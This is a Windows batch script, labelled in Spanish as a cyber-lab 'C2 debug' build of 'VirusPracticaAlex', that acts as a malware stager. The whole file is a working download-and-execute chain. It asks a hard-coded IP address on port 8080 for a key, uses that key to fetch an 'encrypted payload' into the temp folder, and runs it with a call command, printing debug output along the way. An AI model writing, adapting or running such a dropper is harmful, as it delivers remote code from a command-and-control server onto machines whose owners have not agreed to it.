@echo off
setlocal EnableDelayedExpansion
chcp 65001 >nul 2>&1
title C2 DEBUG - VirusPracticaAlex

echo.
echo ╔══════════════════════════════════════╗
echo ║        🔥 C2 DEBUG MODE 🔥            ║
echo ║     VirusPracticaAlex - Lab Ciber    ║
echo ╚══════════════════════════════════════╝
echo.

set "BASE=http://82.29.153.101:8080"
set "FILE=%temp%\sc.bat"

echo 📍 TEMP DIR: %temp%
echo 🌐 BASE URL: %BASE%
echo.

REM ===== 1. TIMESTAMP =====
echo 🔢 [1] Generando TIMESTAMP...
for /f %%i in ('powershell -NoP -Command "[int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds()"') do set "TS=%%i"
echo    -> TS=%TS%
echo    -> TS_LEN=%TS:~9%
echo.

REM ===== 2. KEY GENERATION =====
echo 🔑 [2] Solicitando KEY...
echo    -> URL: %BASE%/auth/key?ts=%TS%
curl -v -s "%BASE%/auth/key?ts=%TS%" > "%temp%\debug_key.txt" 2>&1

for /f "delims=" %%i in ('type "%temp%\debug_key.txt"') do set "KEY=%%i"
if "!KEY!"=="" (
    echo    ❌ [ERROR] KEY VACÍA
    echo    📄 DEBUG KEY: type "%temp%\debug_key.txt"
    pause
    exit /b 1
)

echo    -> KEY=!KEY!
echo    -> KEY_LEN=!KEY:~43!
echo    -> KEY_CHARS=0123456789ABCDEF...[!KEY:~43,1!]

if "!KEY_LEN!" NEQ "44" (
    echo    ❌ [ERROR] KEY inválida (!KEY_LEN! != 44)
    pause
    exit /b 1
)
echo    ✅ KEY OK ✓
echo.

REM ===== 3. PAYLOAD DOWNLOAD =====
echo 📥 [3] Descargando PAYLOAD...
echo    -> HEADER: X-Decrypt-Key: !KEY!
echo    -> OUTPUT: !FILE!

curl -v -s ^
  -H "X-Decrypt-Key: !KEY!" ^
  "%BASE%/payload/encrypted" ^
  -o "!FILE!" ^
  --max-time 15 ^
  > "%temp%\debug_curl.txt" 2>&1

REM Verificar CURL exit code
if errorlevel 1 (
    echo    ❌ [ERROR] CURL falló (errorlevel=%errorlevel%)
    echo    📄 DEBUG CURL: type "%temp%\debug_curl.txt"
    pause
    exit /b 1
)

REM Verificar archivo creado
if not exist "!FILE!" (
    echo    ❌ [ERROR] Archivo NO creado: !FILE!
    dir "%temp%\sc*"
    pause
    exit /b 1
)

REM Verificar tamaño
for %%F in ("!FILE!") do set "SIZE=%%~zF"
echo    -> FILE: !FILE!
echo    -> SIZE: %SIZE% bytes
echo    -> EXISTS: ✓

if %SIZE% LSS 10 (
    echo    ❌ [ERROR] Payload vacío (%SIZE% bytes)
    echo    📄 CONTENIDO:
    type "!FILE!"
    pause
    exit /b 1
)
echo    ✅ PAYLOAD OK ✓
echo.

REM ===== 4. PAYLOAD PREVIEW =====
echo 👁️ [4] PREVIEW PAYLOAD (primeras 500 chars):
echo    ╔══════════════════════════════════════╗
type "!FILE!" | more /e +1 /n 20
echo    ╚══════════════════════════════════════╝
echo.

REM ===== 5. EJECUTAR =====
echo ⚡ [5] EJECUTANDO PAYLOAD...
echo    Presiona cualquier tecla para CONTINUAR o Ctrl+C para cancelar...
pause >nul

echo    -> Llamando: call "!FILE!"
call "!FILE!"

REM ===== 6. POST-EJECUCION =====
echo.
echo ✅ [FIN] C2 completado exitosamente
echo 📂 Archivos debug:
echo    - %temp%\debug_key.txt
echo    - %temp%\debug_curl.txt  
echo    - !FILE!
echo.
pause